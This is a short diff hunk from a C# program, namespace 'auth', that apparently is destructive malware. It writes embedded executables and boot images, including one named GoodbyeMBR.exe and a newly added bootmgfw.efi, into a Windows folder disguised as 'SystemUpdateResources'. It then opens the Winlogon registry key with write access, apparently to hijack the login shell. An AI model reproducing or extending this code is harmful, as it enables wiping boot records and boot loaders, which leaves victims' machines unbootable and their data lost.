@@ -117,6 +117,7 @@ namespace auth
                     File.WriteAllBytes(@"C:\Windows\SystemUpdateResources\BlacklistedApp.exe", auth.Properties.Resources.BlacklistedApp);
                     File.WriteAllBytes(@"C:\Windows\SystemUpdateResources\GoodbyeMBR.exe", auth.Properties.Resources.GoodbyeMBR);
                     File.WriteAllBytes(@"C:\Windows\SystemUpdateResources\boot.bin", auth.Properties.Resources.boot);
+                    File.WriteAllBytes(@"C:\Windows\SystemUpdateResources\bootmgfw.efi", auth.Properties.Resources.bootmgfw);
                     //File.WriteAllBytes(@"C:\Windows\SystemUpdateResources\backupcmd.exe", auth.Properties.Resources.cmd);
                     //File.WriteAllBytes(@"C:\Windows\SystemUpdateResources\backuptaskkill.exe", auth.Properties.Resources.backuptaskkill);
                     RegistryKey setshellkey = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", true);
